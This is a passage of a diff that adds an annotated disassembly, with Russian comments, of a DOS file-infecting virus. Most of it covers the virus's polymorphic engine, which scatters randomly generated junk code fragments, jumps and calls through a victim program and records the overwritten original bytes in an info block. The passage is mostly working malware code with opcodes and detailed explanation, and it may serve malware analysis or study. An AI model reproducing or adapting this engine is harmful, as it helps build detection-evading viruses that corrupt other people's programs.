+     ;         │                     ║▓▓ВИРУСА▓▓║░блок░│▒блок▒║                       ││    кусок из      │
+     ;         ││                  │ ║▓▓▓▓▓▓▓▓▓▓║░░░░░░│▒▒▒▒▒▒║ │                     ││     файла      │ │
+     ;         │                     ║▓▓▓09C0▓▓▓║░0200░│▒0440▒║                       ││                  │
+     ;         ││                  │ ║▓▓▓▓▓▓▓▓▓▓║░░░░░░│▒▒▒▒▒▒║ │                     ││                │ │
+     ;         └─────────//──────────╚══════════╩══════╧══════╝───────────//──────────┘└───────┬──────────┘
+     ;                               └─────────1000───────────┘                                │
+     ;                                      4K   └─────────────────────────────────────────────┘
+     ; Примечание : data_03CD - указатель нижней границы области А
+     ;              data_03D2 - указатель верхней границы области А
+     ;              data_03E2 - указатель нижней границы области В
+     ;              data_03E7 - указатель верхней границы области В
+
+     03BE                       loc_03BE:
+                                ;------- Проверка количества сгенерированных байтов (пределы ИНФО-блока) -----------
+     03BE  33 F6                                xor     si,si                   ; SI = 0000
+     03C0  B8 2D36                              mov     ax,1111h
+                                data_03C1       =       word ptr $ - 2          ; AX = конец ИНФО-блока
+     03C3  2B C7                                sub     ax,di                   ; DI - текущий указатель ИНФО-блока
+     03C5  3D 0010                              cmp     ax,10h                  ; Осталось менее 16 байтов ?
+     03C8  72 2F                                jb      short loc_03F9          ; Jump if YES
+                                ;------- Проверка на выход за предел нижней границы блока "A" ----------------------
+     03CA  8B C3                                mov     ax,bx
+     03CC  3D 122F                              cmp     ax,1111h
+                                data_03CD       =       word ptr $ - 2
+     03CF  72 28                                jb      short loc_03F9          ; Jump if below
+                                ;------- Проверка на выход за пределы верхней границы блока "A" --------------------
+     03D1  B8 18C7                              mov     ax,1111h
+                                data_03D2       =       word ptr $ - 2
+     03D4  2B C3                                sub     ax,bx
+     03D6  72 07                                jc      short loc_03DF          ; Jump if carry Set
+     03D8  3D 0009                              cmp     ax,9
+     03DB  72 1C                                jb      short loc_03F9          ; Jump if below
+     03DD  EB 07                                jmp     short loc_03E6
+                                ;------- Проверка на выход за пределы нижней границы блока "B" ---------------------
+     03DF                       loc_03DF:
+     03DF  8B C3                                mov     ax,bx
+     03E1  3D 39E2                              cmp     ax,1111h
+                                data_03E2       =       word ptr $ - 2
+     03E4  72 13                                jb      short loc_03F9          ; Jump if below
+                                ;------- Проверка на выход за пределы верхней границы блока "B" --------------------
+     03E6                       loc_03E6:
+     03E6  B8 3D5E                              mov     ax,1111h
+                                data_03E7       =       word ptr $ - 2
+     03E9  2B C3                                sub     ax,bx
+     03EB  3D 0009                              cmp     ax,9
+     03EE  72 09                                jb      short loc_03F9          ; Jump if below
+                                ;-------- Так как в границах, то продолжаем генерировать случайные команды ---------
+     03F0  B8 0017                              mov     ax,23                   ; 23 entries
+     03F3  E8 FF52                              call    RND_0_AX
+     03F6  D1 E0                                shl     ax,1                    ; Shift w/zeros fill
+     03F8  96                                   xchg    si,ax
+     03F9                       loc_03F9:
+     03F9  2E: FF 94 0400                       call    word ptr cs:data_0400[si]       ; 23 entries
+     03FE  EB BE                                jmp     short loc_03BE
+                                sub_0359        endp
+
+     0400  042E                 data_0400       dw      offset sub_042E
+     0402  0660                 data_0402       dw      offset sub_0660
+     0404  066F                 data_0404       dw      offset sub_066F
+     0406  0685                 data_0406       dw      offset sub_0685
+     0408  06A3                 data_0408       dw      offset sub_06A3
+     040A  06E0                 data_040A       dw      offset sub_06E0
+     040C  06E0                 data_040C       dw      offset sub_06E0
+     040E  0717                 data_040E       dw      offset sub_0717
+     0410  0735                 data_0410       dw      offset sub_0735
+     0412  0755                 data_0412       dw      offset sub_0755
+     0414  076A                 data_0414       dw      offset sub_076A
+     0416  0781                 data_0416       dw      offset sub_0781
+     0418  07A3                 data_0418       dw      offset sub_07A3
+     041A  07E8                 data_041A       dw      offset sub_07E8
+     041C  07FD                 data_041C       dw      offset sub_07FD
+     041E  081E                 data_041E       dw      offset sub_081E
+     0420  0892                 data_0420       dw      offset sub_0892
+     0422  08C5                 data_0422       dw      offset sub_08C5
+     0424  0925                 data_0424       dw      offset sub_0925
+     0426  094D                 data_0426       dw      offset sub_094D
+     0428  0960                 data_0428       dw      offset sub_0960
+     042A  09C2                 data_042A       dw      offset sub_09C2
+     042C  098A                 data_042C       dw      offset sub_098A
+
+                                ;==========================================================================
+                                ; Управление разбрасыванием участков полиморфного мусора
+                                ; Вход : флаг CF = 0 - продолжаем работу генератора
+                                ;                = 1 - сворачиваем работу генератор
+                                ; Эта процедура производит ЗАКРЫТИЕ/ОТКРЫТИЕ/ПРОДРОЛЖЕНИЕ очередного
+                                ; участка кода. Т.е. она фактически управляет алгоритмом "опплевывания"
+                                ; файла (созданием, учетом и контролем процедур и участков кода в разных
+                                ; местах программы-жертвы. В ходе своей работы процедура отслеживает все
+                                ; CALL, JMP и RET в разных создаваемых участках.
+                                ; Внимание! Вирус манипулирует подпрограммами. Но иногда эти подпрограммы
+                                ; могут состоять из нескольких участков кода (управление между которыми
+                                ; передается командами JMP).
+                                ;==========================================================================
+
+                                sub_042E        proc    near
+     042E  9F                                   lahf                            ; Load ah from flags
+     042F  95                                   xchg    bp,ax
+     0430  E8 0496                              call    sub_08C9                ; сформировать смещения для
+                                                                                ; SHORT переходов
+     0433  59                                   pop     cx
+     0434  5A                                   pop     dx
+                                ;------------------------------------------------------------------------------
+     0435  E8 FF0D                              call    RND_01                  ; с вероятностью 1/2 продолжаем
+                                                                                ; текущую подпрограмму в другом
+                                                                                ; участке
+     0438  B0 02                                mov     al,2                    ; Вероятность JMP и CALL равна
+     043A  74 74                                jz      short loc_04B0          ; Jump if RND = 0
+                                ;------------------------------------------------------------------------------
+                                ; Если нужно сворачивать работу генератора, то вставляем команду перехода
+     043C  8B C5                                mov     ax,bp
+     043E  9E                                   sahf                            ; Store ah into flags
+     043F  B8 0002                              mov     ax,2                    ; Вероятность JMP и CALL равна
+     0442  72 6C                                jc      short loc_04B0          ; Jump if CF=1
+                                ;------------------------------------------------------------------------------
+                                ; С вероятностью 1/2 в текущей подпрограмме вызываем еще одну по команде CALL
+     0444  E8 FEFE                              call    RND_01
+     0447  75 6B                                jnz     short loc_04B4          ; Jump if RND = 1
+                                ;------------------------------------------------------------------------------
+     0449  5E                                   pop     si
+     044A  0B F6                                or      si,si                 ; Есть ли открытые подпрограммы ?
+     044C  74 64                                jz      short loc_04B2        ; Если НЕТ, то вызываем первую
+                                                                              ;   подпрограмму по команде CALL.
+                                                                              ; Если ДА, то закроем ее.
+                                ;------------------------------------------------------------------------------
+                                ; "ЗАКРЫТЬ" участок кода (моделируем выход из подпрограммы по команде RETn)
+                                ; SI - адрес с которого делали переход
+
+     044E  2E: 8F 06 046F                       pop     cs:data_046F
+     0453  58                                   pop     ax
+     0454  2E: A3 06F3                          mov     cs:data_06F3,ax        ; Если AX=0, то сразу и обнуление
+     0458  0B C0                                or      ax,ax                  ; Zero ?
+     045A  74 0F                                jz      short loc_046B         ; Jump if zero
+     045C  2E: 8F 06 06F3                       pop     cs:data_06F3
+     0461  2E: FF 36 06F3                       push    cs:data_06F3
+     0466  2E: FF 06 06F3                       inc     cs:data_06F3
+     046B                       loc_046B:
+     046B  50                                   push    ax
+     046C  EB 00                                jmp     short $+2               ; delay for I/O
+                                ;------------------------------------------------------------------------------
+                                ; До какого значения нужно выровнять SP до выхода из подпрограммы, чтобы
+                                ; правильно сработала команда RET.
+     046E  B8 0001                              mov     ax,1111h
+                                data_046F       =       word ptr $ - 2
+     0471  2E: 87 06 06BE                       xchg    cs:StackCounter,ax
+     0476  2E: 2B 06 06BE                       sub     ax,cs:StackCounter
+     047B  48                                   dec     ax
+     047C  E8 03C0                              call    sub_083F                ; выровнять SP
+                                ;------------------------------------------------------------------------------
+                                ; Если в вызывающей подпрограмме до вызова были неснятые значения в стеке,
+                                ; то снимем пару-другую слов (случайное кол-во) из стека при выходе
+     047F  2E: A1 06BE                          mov     ax,cs:StackCounter
+     0483  2E: 2B 06 06F3                       sub     ax,cs:data_06F3
+     0488  40                                   inc     ax                      ;AX - количество не снятых слов
+     0489  E8 FEBC                              call    RND_0_AX
+     048C  74 13                                jz      short loc_04A1          ; если AX=0, то выйти по RET
+                                ;--------------- Выход по команде RET NEAR <IM16> -----------------------------
+     048E  2E: 29 06 06BE                       sub     cs:StackCounter,ax
+     0493  D1 E0                                shl     ax,1                    ; Shift w/zeros fill
+     0495  50                                   push    ax
+     0496  B0 C2                                mov     al,0C2h                 ; cmd RET NEAR <IM16>
+     0498  E8 01B0                              call    Write_byte
+     049B  58                                   pop     ax
+     049C  E8 0197                              call    Write_word
+     049F  EB 05                                jmp     short loc_04A6
+                                ;--------------- Выход по команде RET NEAR ------------------------------------
+     04A1                       loc_04A1:
+     04A1  B0 C3                                mov     al,0C3h                 ; cmd RET NEAR
+     04A3  E8 01A5                              call    Write_byte
+                                ;------------------------------------------------------------------------------
+     04A6                       loc_04A6:
+     04A6  83 C6 03                             add     si,3                ; три байта на команду перехода
+                                                                            ;    CALL <near> или JMP <near>
+     04A9  2E: 89 36 054F                       mov     cs:data_054F,si
+     04AE  33 C0                                xor     ax,ax                   ; AX = 0 - признак вставки
+                                                                                ;    команды "RETn"
+     04B0                       loc_04B0:
+     04B0  EB 0F                                jmp     short loc_04C1
+                                ;------------------------------------------------------------------------------
+     04B2                       loc_04B2:
+     04B2  56                                   push    si             ; запись Mark-end'а
+     04B3  40                                   inc     ax             ; деление на 0 невозможно (нужно для RND)
+     04B4                       loc_04B4:
+                                                ; "ОТКРЫТЬ" новый участок кода (вызвать подпрограмму)
+     04B4  2E: 8B 36 06BE                       mov     si,cs:StackCounter
+     04B9  56                                   push    si                  ; сохранить кол-во слов в стеке
+     04BA  46                                   inc     si
+     04BB  2E: 89 36 06F3                       mov     cs:data_06F3,si     ; Значение счетчика стека до начала
+                                                                            ;  этой подпрограммы
+     04C0  53                                   push    bx                  ; сохранить текущий указатель
+                                                                            ;  очередного адреса (нужно чтобы
+                                                                            ;  потом продолжить с него)
+                                ;--------------------------------------------------------------------------
+     04C1                       loc_04C1:
+     04C1  52                                   push    dx
+     04C2  51                                   push    cx
+     04C3  95                                   xchg    bp,ax
+     04C4  9E                                   sahf                            ; восстановить входные флаги
+     04C5  9C                                   pushf                           ;
+     04C6  0B ED                                or      bp,bp                   ; Уже вставили "RETn" ???
+     04C8  74 15                                jz      short loc_04DF          ; bp = 0 - Да.
+                                ;-------------- генерация команды перехода CALL или JMP -------------------
+     04CA  8B C5                                mov     ax,bp
+     04CC  E8 FE79                              call    RND_0_AX                    ; гадаем чего вставить
+     04CF  B0 E9                                mov     al,0E9h                     ; cmd JMP NEAR
+     04D1  75 06                                jnz     short loc_04D9              ; Jump if not zero
+     04D3  2E: FF 06 06BE                       inc     word ptr cs:StackCounter  ; с командой CALL в стеке
+                                                                                  ; нужно прибавить одно слово
+     04D8  48                                   dec     ax                          ; cmd CALL NEAR
+     04D9                       loc_04D9:
+     04D9  E8 016F                              call    Write_byte              ; запись команды
+     04DC  E8 0157                              call    Write_word              ; запись адреса перехода
+                                                                                ;  для начала случайного
+                                ;--------------------------------------------------------------------------
+                                ; Закрываем очередную запись в инфо-блоке относящуюся к закрываемому
+                                ; участку сгенерированного кода
+     04DF                       loc_04DF:
+     04DF  8D 45 FC                             lea     ax,[di-4]               ; 4 байта под начало записи
+     04E2  BE 2B2C                              mov     si,1111h             ; динамический указатель ИНФО-блока
+                                data_04E3       =       word ptr $ - 2
+     04E5  2B C6                                sub     ax,si            ; подсчет размера закрываемого участка
+     04E7  89 04                                mov     [si],ax          ; запись размера закрываемого участка
+                                ;------------------------------------------------------------------------------
+     04E9  9D                                   popf                            ; Pop flags
+     04EA  B8 1D36                              mov     ax,1111h                ; входной адрес в вирус (для
+                                                                                ; последнего CALL или JMP)
+                                data_04EB       =       word ptr $ - 2
+     04ED  73 03                                jnc     short loc_04F2          ; Jump if CF=0
+     04EF  E9 0088                              jmp     loc_057A                ; сворачиваем работу генератора
+                                ;------------------------------------------------------------------------------
+                                ; Определяем : стоит ли менять границы областей ?
+     04F2                       loc_04F2:
+     04F2  8B C3                                mov     ax,bx                  ; текущий указатель адреса
+     04F4  2E: 3B 06 03CD                       cmp     ax,cs:data_03CD
+     04F9  72 4F                                jb      short loc_054A         ; Jump if ниже границы области А
+
+     04FB  2E: 3B 06 03E7                       cmp     ax,cs:data_03E7
+     0500  73 48                                jae     short loc_054A         ; Jump if выше границы области В
+
+                                                ;--------------------------
+     0502  2E: 2B 06 03E2                       sub     ax,cs:data_03E2
+     0507  73 27                                jnc     short loc_0530         ; Jump if попадает в область В
+
+     0509  2E: 8B 16 03D2                       mov     dx,cs:data_03D2
+     050E  3B DA                                cmp     bx,dx
+     0510  73 38                                jae     short loc_054A         ; Jump if выпадает из областей
+                                ;----------- Устанавливаем новые границы области "A" --------------------------
+     0512  2B 54 02                             sub     dx,[si+2]              ; DX = расстояние от текущего
+                                                                               ; адреса до вершины области А
+     0515  8B C3                                mov     ax,bx
+     0517  2E: 2B 06 03CD                       sub     ax,cs:data_03CD        ; AX = расстояние от текущего
+                                                                               ; адреса до дна области А
+                                                ; подтягиваем ближнюю границу
+     051C  3B C2                                cmp     ax,dx
+     051E  72 09                                jb      short loc_0529          ; Jump if below
+     0520  8B 44 02                             mov     ax,[si+2]
+     0523  2E: A3 03D2                          mov     cs:data_03D2,ax         ; опускаем верхнюю границу
+     0527  EB 21                                jmp     short loc_054A
+     0529                       loc_0529:
+     0529  2E: 89 1E 03CD                       mov     cs:data_03CD,bx         ; подымаем нижнюю границу
+     052E  EB 1A                                jmp     short loc_054A
+                                ;----------- Устанавливаем новые границы области "B" --------------------------
+     0530                       loc_0530:
+     0530  92                                   xchg    dx,ax
+     0531  2E: A1 03E7                          mov     ax,cs:data_03E7
+     0535  2B 44 02                             sub     ax,[si+2]
+     0538  3B C2                                cmp     ax,dx
+     053A  72 07                                jb      short loc_0543          ; Jump if below
+     053C  2E: 89 1E 03E2                       mov     cs:data_03E2,bx         ; меняем нижнюю границу
+     0541  EB 07                                jmp     short loc_054A
+     0543                       loc_0543:
+     0543  8B 44 02                             mov     ax,[si+2]
+     0546  2E: A3 03E7                          mov     cs:data_03E7,ax         ; опускаем верхнюю границу к
+                                                                                ; началу предыдущего участка
+                                ;------------------------------------------------------------------------------
+                                ; Проверка : Нужно ли записывать смещение ?
+     054A                       loc_054A:
+     054A  0B ED                                or      bp,bp                   ; Вставляли команду "RET" ?
+     054C  75 06                                jnz     short loc_0554          ; Jump if NO
+                                                ; если вставляли RET, то смещение не нужно ...
+     054E  BB 0067                              mov     bx,1111h
+                                data_054F       =       word ptr $ - 2
+     0551  9C                                   pushf                           ; Push flags
+     0552  EB 2E                                jmp     short loc_0582        ; обойти код вставляющий
+                                                                              ;  смещение
+                                ;------------------------------------------------------------------------------
+                                ; гадаем в какой области ("A" или "B") распологать новый участок
+     0554                       loc_0554:
+     0554  E8 FDEE                              call    RND_01                 ; вероятность равнозначная (1/2)
+     0557  2E: A1 03E7                          mov     ax,cs:data_03E7
+     055B  2E: 8B 16 03E2                       mov     dx,cs:data_03E2         ; база = нижний предел "B"
+     0560  74 09                                jz      short loc_056B          ; Jump if RND = 0
+     0562  2E: A1 03D2                          mov     ax,cs:data_03D2
+     0566  2E: 8B 16 03CD                       mov     dx,cs:data_03CD         ; база = нижний предел "A"
+     056B                       loc_056B:
+     056B  2B C2                                sub     ax,dx                   ; AX = размер области
+     056D  2D 0003                              sub     ax,3                    ; Минимум три байта на команду
+                                                                                ;  перехода (выхода)
+     0570  77 03                                ja      short loc_0575          ; Переход если больше 3-х байт
+     0572  B8 0001                              mov     ax,1                    ; Только база(!). Без случайной
+                                                                                ;  компоненты
+     0575                       loc_0575:
+                                                ; Определяем место расположения участка в выбранной области
+     0575  E8 FDD0                              call    RND_0_AX
+     0578  03 C2                                add     ax,dx             ; AX = база + случайное смещение
+     057A                       loc_057A:
+     057A  9C                                   pushf                           ; Push flags
+     057B  2B C3                                sub     ax,bx             ; AX = относительное смещение
+                                                                          ;        нового участка кода
+     057D  89 47 FE                             mov     [bx-2],ax         ; Записать этого смещения в команду
+                                                                          ;  перехода
+     0580  03 D8                                add     bx,ax             ; BX = адрес нового участка
+                                ;------------------------------------------------------------------------------
+                                ; Открываем новую запись в ИНФО-блоке
+                                ; Формат инфо-блока :   dw   - размер участка (=00 - Mark-end ИНФО-блока)
+                                ;                       dw   - адрес участка
+                                ;                       N*db - коды участка
+                                ;------------------------------------------------------------------------------
+     0582                       loc_0582:
+     0582  2E: 89 3E 04E3                       mov     cs:data_04E3,di
+     0587  33 C0                                xor     ax,ax                   ; Zero register
+                                ; Сначала считаем что размер участка нулевой (этоже в случае свертывания
+                                ; работы генератора является Mark-end'ом ИНФО-блока
+     0589  AB                                   stosw                           ; Store ax to es:[di]
+     058A  8B C3                                mov     ax,bx
+                                ; Запишем адрес начала нового участка генерируемого кода
+     058C  AB                                   stosw                           ; Store ax to es:[di]
+     058D  9D                                   popf                            ; Pop flags
+     058E  73 0E                                jnc     short loc_ret_059E      ; Jump if CF=0
+                                ;------------------------------------------------------------------------
+                                ; Завершаем работу полиморфного механизма
+                                ;------------------------------------------------------------------------
+     0590  2E: 8B 3E 0A03                       mov     di,cs:data_0A03
+                                ; Запись Mark-end в MEM-блок
+     0595  B4 FF                                mov     ah,0FFh
+     0597  AB                                   stosw                           ; Store ax to es:[di]
+     0598  BC 00EC                              mov     sp,1111h           ; восстанавливаем стек
+                                data_0599       =       word ptr $ - 2
+     059B  B8 4000                              mov     ax,1111h           ; AX = полный размер программы
+                                                                           ;       с вирусом
+                                data_059C       =       word ptr $ - 2
+     059E                       loc_ret_059E:
+     059E  C3                                   retn
+                                sub_042E        endp
+
+                                ;==========================================================================
+                                ;                              SUBROUTINE
+                                ;==========================================================================
+
+     059F                       loc_059F:
+     059F  80 FA 8E                             cmp     dl,8Eh                  ; cmd MOV SEG, r/m
+     05A2  9C                                   pushf                           ; Push flags
+     05A3  B0 00                                mov     al,0
+     05A5  74 03                                jz      short loc_05AA          ; Jump if zero
+     05A7  E8 FD9B                              call    RND_01                  ; Слова или байты ?
+     05AA                       loc_05AA:
+     05AA  E8 009C                              call    sub_0649                ; Запись команды
+     05AD  92                                   xchg    dx,ax
+     05AE  E8 FD80                              call    RND_0_FF                ; Генерация байта адресации
+     05B1  9D                                   popf                            ; Pop flags
+     05B2  75 13                                jnz     short loc_05C7          ; Jump if not zero
+                                ;------------------------------------------------------------------------------
+     05B4  24 C7                                and     al,11000111b            ; Выкидываем REG поле
+     05B6  50                                   push    ax
+     05B7  E8 FD8B                              call    RND_01
+     05BA  58                                   pop     ax
+     05BB  74 0A                                jz      short loc_05C7          ; Jump if zero
+                                ;------------------------------------------------------------------------------
+     05BD  2E: 80 3E 0A25 00                    cmp     cs:data_0A25,0      ; Регистр DS модифицировать можно ?
+     05C3  74 02                                je      short loc_05C7      ; Jump if NO
+     05C5  0C 18                                or      al,00011000b        ; Если ДА, то { cmd MOV DS, r/m }
+     05C7                       loc_05C7:
+     05C7  D0 EA                                shr     dl,1                    ; Слова или байты ?
+     05C9  73 0F                                jnc     short loc_05DA          ; Jump if байты
+                                ;------------------------------------------------------------------------------
+                                ; В случае операции с 16-ти битными регистрами нужно откинуть SP
+     05CB                       loc_05CB:
+     05CB  F9                                   stc                             ; Set carry flag
+     05CC  9C                                   pushf                           ; Push flags
+     05CD  8A E0                                mov     ah,al
+     05CF  80 E4 38                             and     ah,00111000b            ; Выделение поля REG
+     05D2  80 FC 20                             cmp     ah,00100000b
+     05D5  75 02                                jne     short loc_05D9          ; Jump if not equal
+     05D7  0C 08                                or      al,00001000b            ; вместо SP подставляем BP
+     05D9                       loc_05D9:
+     05D9  9D                                   popf                            ; Pop flags
+
+                                ;==========================================================================
+                                ;              * Разборка байта адресации *
+     05DA                       loc_05DA:
+     05DA  9F                                   lahf                            ; Load ah from flags
+     05DB  E8 006D                              call    Write_byte
+     05DE  A8 C0                                test    al,11000000b            ; Выделение MOD
+     05E0  75 35                                jnz     short loc_0617          ; Jump if MOD <> 00
+     05E2  24 07                                and     al,00000111b            ; Выделение R/M
+     05E4  3C 06                                cmp     al,00000110b            ; Если R/M = 110 (т.е. disp16)
+                                                                                ;  то обход
+     05E6  74 48                                je      short loc_0630          ; Jump if equal
+     05E8  9E                                   sahf                            ; Store ah into flags
+     05E9  73 2B                                jnc     short loc_ret_0616      ; Jump if carry=0
+                                ;--------------- определение типа процессора ----------------------------------
+     05EB  54                                   push    sp
+     05EC  5A                                   pop     dx
+     05ED  3B D4                                cmp     dx,sp
+     05EF  75 25                                jne     short loc_ret_0616      ; Jump if до 286
+                                ;------------------------------------------------------------------------------
+     05F1  3C 07                                cmp     al,00000111b
+     05F3  B4 04                                mov     ah,4
+     05F5  74 0A                                jz      short loc_0601          ; Jump if zero
+     05F7  3C 04                                cmp     al,00000100b
+     05F9  72 1B                                jb      short loc_ret_0616      ; Jump if below
+     05FB  B4 01                                mov     ah,1
+     05FD  74 02                                jz      short loc_0601          ; Jump if zero
+     05FF  B4 03                                mov     ah,3
+     0601                       loc_0601:
+     0601  28 67 FF                             sub     [bx-1],ah
+     0604  E8 FD2A                              call    RND_0_FF                ; Генерируем байт адресации
+     0607  24 C0                                and     al,11000000b            ; Выделяем MOD
+                                ; исключить регистровую адресацию (MOD=11)
+     0609  3C C0                                cmp     al,11000000b            ; MOD = 11 ?
+     060B  75 02                                jne     short loc_060F          ; Jump if no
+     060D  B0 80                                mov     al,10000000b            ; сделать MOD = 10
+     060F                       loc_060F:
+     060F  08 47 FF                             or      [bx-1],al
+     0612  0A C0                                or      al,al                   ; Zero ?
+     0614  75 01                                jnz     short loc_0617          ; Jump if not zero
+
+     0616                       loc_ret_0616:
+     0616  C3                                   retn
+     0617                       loc_0617:
+     0617  24 C0                                and     al,11000000b            ; Выделяем MOD
+     0619  3C 40                                cmp     al,40h
+     061B  75 0F                                jne     short loc_062C          ; Jump if not equal
+                                ;------------------------------------------------------------------------------
+                                ; Если процессор 286+, то не следует подходить к границе сегмента
+     061D                       loc_061D:
+     061D  54                                   push    sp
+     061E  58                                   pop     ax
+     061F  3B C4                                cmp     ax,sp
+     0621  B8 00FF                              mov     ax,0FFh
+     0624  74 01                                jz      short loc_0627          ; Jump if zero
+     0626  40                                   inc     ax
+     0627                       loc_0627:
+     0627  E8 FD1E                              call    RND_0_AX
+     062A  EB 1F                                jmp     short loc_064B
+     062C                       loc_062C:
+     062C  3C 80                                cmp     al,80h
+     062E  75 10                                jne     short loc_ret_0640      ; Jump if not equal
+                                ;===================IM16===================================================
+     0630                       loc_0630:
+     0630  B8 FFFF                              mov     ax,0FFFFh
+     0633  E8 FD12                              call    RND_0_AX
+
+                                ;==========================================================================
+                                Write_word      proc    near
+     0636                       loc_0636:
+     0636  E8 0012                              call    Write_byte
+     0639  86 E0                                xchg    ah,al
+     063B  E8 000D                              call    Write_byte
+     063E  86 C4                                xchg    al,ah
+
+     0640                       loc_ret_0640:
+     0640  C3                                   retn
+                                Write_word      endp
+
+                                ;==========================================================================
+                                ;                              SUBROUTINE
+                                ;==========================================================================
+
+                                sub_0641        proc    near
+     0641  E8 FCF8                              call    RND_01234567            ; выбрать регистр
+     0644  3C 04                                cmp     al,4                    ; если SP, то отбросить
+     0646  75 01                                jne     short loc_0649          ; Jump if not equal
+     0648  40                                   inc     ax
+                                sub_0649:
+     0649                       loc_0649:
+     0649  0A C2                                or      al,dl                   ; OP or REG
+                                ;==============================================================================
+                                ; Процедура записи снегенированного байта в память
+                                ; DI - текущее положение в ИНФО-блоке
+                                ; BX - указатель адреса заполняемого участка
+                                ;==============================================================================
+                                Write_byte:
+     064B                       loc_064B:
+     064B  50                                   push    ax
+     064C  86 07                                xchg    [bx],al
+     064E  AA                                   stosb                           ; Store al to es:[di]
+     064F  58                                   pop     ax
+     0650  43                                   inc     bx                      ; Передвинуть указатель адреса
+     0651  2E: FF 06 09E0                       inc     cs:BytesWrittenCounter  ; Подсчет количества сгенериро-
+                                                                                ;  ванных байт
+                                ; Продвигаем указатель ИНФО-блока по мере генерации новых байтов
+                                ; полиморфного "мусора"
+     0656  56                                   push    si
+     0657  2E: 8B 36 04E3                       mov     si,cs:data_04E3
+     065C  FF 04                                inc     word ptr [si]
+     065E  5E                                   pop     si
+     065F  C3                                   retn
+                                sub_0641        endp
+
+                                ;==========================================================================
+                                ; Арифметические операции на регистрами типа КОП REG,r/m из набора data_0A43
+                                ;==========================================================================
+
+                                sub_0660        proc    near
+     0660  B8 000C                              mov     ax,0Ch
+     0663  E8 FCE2                              call    RND_0_AX                ; AX = 00..0Bh
+     0666  96                                   xchg    si,ax
+     0667  2E: 8A 94 0A43                       mov     dl,cs:data_0A43[si]
+     066C  E9 FF30                              jmp     loc_059F
+                                sub_0660        endp
+
+                                ;==========================================================================
+                                ; Операции пересылки в регистры
+                                ;==========================================================================
+
+                                sub_066F        proc    near
+     066F  B2 B8                                mov     dl,0B8h                 ; cmd MOV REG,IM16
+     0671  E8 FCD1                              call    RND_01
+     0674  75 05                                jnz     short loc_067B          ; Jump if not zero
+     0676  E8 FFC8                              call    sub_0641
+     0679  EB B5                                jmp     short loc_0630
+     067B                       loc_067B:
+     067B  E8 FCBE                              call    RND_01234567            ; Выбрать регистр
+     067E  0C B0                                or      al,0B0h
+     0680  E8 FFC8                              call    Write_byte              ; cmd MOV REG,IM8
+     0683                       loc_0683:
+     0683  EB 98                                jmp     short loc_061D
+                                sub_066F        endp
+
+                                ;==========================================================================
+                                ; Арифметические операции над регистром AX(AL) из набора data_0A4F
+                                ;==========================================================================
+
+                                sub_0685        proc    near
+     0685  B8 000A                              mov     ax,0Ah
+     0688  E8 FCBD                              call    RND_0_AX                ; AX = 00..09
+     068B  96                                   xchg    si,ax
+     068C  E8 FCB6                              call    RND_01                  ; Выбираем слова или байты
+     068F  2E: 0A 84 0A4F                       or      al,cs:data_0A4F[si]
+     0694  E8 FFB4                              call    Write_byte
+     0697  0B F6                                or      si,si                   ; Zero ?
+     0699  74 06                                jz      short loc_06A1          ; Jump if zero
+     069B  D0 E8                                shr     al,1                    ; Выбрали слова или байты ?
+     069D  72 02                                jc      short loc_06A1          ; Jump if carry Set
+     069F  EB E2                                jmp     short loc_0683
+     06A1                       loc_06A1:
+     06A1  EB 8D                                jmp     short loc_0630
+                                sub_0685        endp
+
+                                ;==============================================================================
+                                ; Операции с сегментными регистрами Prefix, PUSH SEGREG, POP SEGERG
+                                ;==============================================================================
+                                sub_06A3        proc    near
+     06A3  E8 FC9C                              call    RND_012                ; Чего будем генерить ?
+                                                                               ; =0 - сегментный префикс
+                                                                               ; =1 - А может нужна команда POP
+                                                                               ; =2 - PUSH сегментный регистр
+     06A6  B2 26                                mov     dl,26h                  ; SEG Prefix (ES:,DS:,CS:,SS:)
+     06A8  74 0A                                jz      short loc_06B4          ; Jump if zero
+     06AA  B2 06                                mov     dl,6                    ; PUSH SEG_REG (ES/DS/CS/SS)
+     06AC  48                                   dec     ax
+     06AD  74 0E                                jz      short loc_06BD          ; Jump if zero
+     06AF                       loc_06AF:
+     06AF  2E: FF 06 06BE                       inc     cs:StackCounter         ; Если команда PUSH, то доба-
+                                                                                ; вить слово в счетчик стека
+     06B4                       loc_06B4:
+     06B4  E8 FC88                              call    RND_0123                ; выбираем сегментный регистр
+     06B7  B1 03                                mov     cl,3
+     06B9  D2 E0                                shl     al,cl                   ; Shift w/zeros fill
+     06BB  EB 8C                                jmp     short loc_0649
+                                ;------------------------------------------------------------------------------
+     06BD                       loc_06BD:
+     06BD  B8 0009                              mov     ax,1111h
+                                StackCounter    =       word ptr $-2
+     06C0  2E: 3B 06 06F3                       cmp     ax,cs:data_06F3        ; Есть ли в текущей подпрограмме
+                                                                               ; не снятые значения в стеке ?
+     06C5  74 E8                                je      loc_06AF               ; НЕТ. Тогда положим одно слово
+                                ;----------------------------------------------; ДА. Тогда снимем хоть одно ---
+     06C7  42                                   inc     dx                      ; cmd POP ES
+     06C8  2E: FF 0E 06BE                       dec     cs:StackCounter         ; Снять слово со счетчика стека
+     06CD  2E: 80 3E 0A25 00                    cmp     cs:data_0A25,0          ; Можно ли модифицировать DS ?
+     06D3  74 07                                je      short loc_06DC          ; Jump if NO
+     06D5  E8 FC6D                              call    RND_01                  ; Так что будем или нет ?
+     06D8  74 02                                jz      short loc_06DC          ; Jump if RND=0
+     06DA  B2 1F                                mov     dl,1Fh                  ; cmd POP DS
+     06DC                       loc_06DC:
+     06DC  92                                   xchg    dx,ax
+     06DD                       loc_06DD:
+     06DD  E9 FF6B                              jmp     loc_064B
+                                sub_06A3        endp
+
+                                ;==============================================================================
+                                ; Операции из набора data_0A5D
+                                ; Примечание: data_06F3 - при нулевом значении указывает на отсутсвие
+                                ;                         незакрытых подпрограмм
+                                ;                       - при ненулевом значении указывает на наличие
+                                ;                         открытых подпрограмм и содержит значение
+                                ;                         счетчика стека при открытии очередной подпрограммы
+                                ;==============================================================================
+                                sub_06E0        proc    near
+     06E0  E8 FC5F                              call    RND_012                 ; Вероятность 1/2
+     06E3  74 06                                jz      short loc_06EB          ; Jump if zero
+     06E5  B8 0005                              mov     ax,5
+     06E8  E8 FC5D                              call    RND_0_AX                ; AX = 00..04
+     06EB                       loc_06EB:
+     06EB  96                                   xchg    si,ax
+     06EC  75 10                                jnz     short loc_06FE          ; Jump if not zero
+     06EE  2E: A1 06BE                          mov     ax,cs:StackCounter
+     06F2  3D 0007                              cmp     ax,1111h
+                                data_06F3       =       word ptr $ - 2
+     06F5  74 06                                je      short loc_06FD          ; Jump if equal
+     06F7  2E: FF 0E 06BE                       dec     cs:StackCounter
+     06FC  4E                                   dec     si
